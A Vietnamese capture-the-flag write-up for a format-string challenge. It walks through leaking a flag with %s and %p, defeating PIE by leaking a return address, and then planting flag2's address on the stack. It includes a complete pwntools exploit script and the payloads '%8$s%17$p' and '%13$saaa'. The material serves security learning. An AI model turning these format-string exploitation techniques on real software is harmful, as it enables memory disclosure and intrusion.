# FMTSTR3-Leak dữ liệu kết hợp %p và %s

**1 bài tập kết hợp giữa %p và %s**

**ida:**

```
unsigned __int64 run()
{
  int v1; // [rsp+Ch] [rbp-44h]
  void *ptr; // [rsp+10h] [rbp-40h]
  FILE *stream; // [rsp+18h] [rbp-38h]
  char s[8]; // [rsp+20h] [rbp-30h] BYREF
  __int64 v5; // [rsp+28h] [rbp-28h]
  char format[8]; // [rsp+30h] [rbp-20h] BYREF
  __int64 v7; // [rsp+38h] [rbp-18h]
  __int64 v8; // [rsp+40h] [rbp-10h]
  unsigned __int64 v9; // [rsp+48h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  *(_QWORD *)format = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  *(_QWORD *)s = 0LL;
  v5 = 0LL;
  ptr = malloc(0x100uLL);
  stream = fopen("./flag.txt", "r");
  if ( !stream )
  {
    puts("Cannot open flag.txt");
    exit(0);
  }
  fseek(stream, 0LL, 2);
  v1 = ftell(stream);
  fseek(stream, 0LL, 0);
  fread(ptr, v1 / 2, 1uLL, stream);
  fread(&flag2, v1, 1uLL, stream);
  fclose(stream);
  puts("What's your name?");
  printf("Your name: ");
  fgets(s, 16, stdin);
  printf("Hello ");
  printf(s);
  puts("Welcome to transylvania\n");
  printf("Say a greeting: ");
  fgets(format, 24, stdin);
  printf(format);
  puts("It's nice to meet you here");
  return __readfsqword(0x28u) ^ v9;
}
```

ở đây ta có lỗi **format string** 

**hàm fseek gán con trỏ ptr nửa flag đầu, nửa flag sau thì gán vào flag2**

checksec và vm:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/984fac9f-9fea-4fac-8a26-802f6d1e365d)


**ở đây ta thấy pie mở với địa chỉ stack có 6 byte nên ta chắc chắn đây là địa chỉ động**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/562737d5-dd4d-45e5-bd5a-f4e0d729ed08)


tại đây ta thể dùng **%s** để leak được nửa flag đầu

**vấn đề nan giải ở đây là địa chỉ của flag2 ko nằm ở stack, ta ko thể xác định được địa chỉ flag2 nằm đâu để dùng format string lấy flag**

**hướng giải quyết:**

- vì địa chỉ flag2 ko nằm trong stack nên ý tưởng đâu tiên trong đầu là leak ra địa chỉ flag2 sau đó gán vào trong stack, từ đó lợi dụng lỗi fmtstr để lấy flag
- để lấy được địa chỉ flag2 ta cần có được địa chỉ base của file
- để có được địa chỉ base thì ta cần leak được địa chỉ của rip , lý do là địa chỉ rip luôn cố định trong mỗi lần chạy

**tóm tắt ý tưởng:**

***fmtstr -> leak rip -> offset -> leak base -> offset -> leak flag2***

![image](https://github.com/gookoosss/CTF.-/assets/128712571/3cb1c1ef-430f-4cbe-86f6-73ba398aa3c3)


đầu tiên ta cần **8 %s** để leak nữa flag đầu, **12 %p** sau để leak ra địa chỉ rip

**h ta tính offset từ rip đến địa chỉ base:**
![image](https://github.com/gookoosss/CTF.-/assets/128712571/fec79126-8d9e-48fb-a389-9bd429f58bb5)



**tính offset từ địa chỉ base đến flag 2:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/978fc83e-f938-4ae8-8d2b-28ace5d69fc6)


**h ta viết script nhập lần đầu:**


![image](https://github.com/gookoosss/CTF.-/assets/128712571/345ea3d8-e8a3-4d3c-a61a-57947cabd79f)


chạy thử xem ta có leak đúng ko 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/2344cbe8-0199-4e0f-8a07-efe1a595025e)


mình tự check thì thấy đúng r nha

**h đến lần nhập 2, ta cần gán địa chỉ flag2  vào trong stack**

ta thấy cần nhập đủ **8byte** để địa chỉ của **flag2** nằm trọn trong stack , từ đó ta có thể dùng %s để leak ra flag2

ở đây ta đếm thừ cần **13 %s** để đến địa chỉ stack chứa **flag2**, nhưng mà **%13$s** thì chỉ có 5byte , nên ta cần 3byte nữa để đủ 8byte

![image](https://github.com/gookoosss/CTF.-/assets/128712571/5f2f9178-8902-472e-b9d6-759e68ff1e12)


**full script:**

```
from pwn import *

p = process('./fmtstr3')
exe = ELF('./fmtstr3')

flag = b''
gdb.attach(p, gdbscript = '''
b*run+364
b*run+434
c
''')

input()

#((rsp + ?) - rsp)/8 + 6
payload = b'%8$s%17$p'
p.sendlineafter(b'name: ', payload)
p.recvuntil(b'Hello ')
flag += p.recvuntil(b'0x', drop = True)
exe_leak = int(p.recvline()[:-1], 16)
exe_address = exe_leak - 0x14e6
flag2_addr = exe_address + 0x4060
log.info("Flag 1: " + flag.decode())
log.info("Exe leak: " + hex(exe_leak))
log.info("Exe base: " + hex(exe_address))
log.info("Flag2 address: " + hex(flag2_addr))

payload = b'%13$saaa'
payload += p64(flag2_addr)
p.sendlineafter(b'greeting: ', payload)
flag += p.recvuntil(b'}')
log.info("Flag: " + flag.decode())

p.interactive()
```

chạy lại lần nữa thì ta ra được flag rồi nha

![image](https://github.com/gookoosss/CTF.-/assets/128712571/71b26f53-4eb3-4709-80f4-b1eb6bd38ac1)




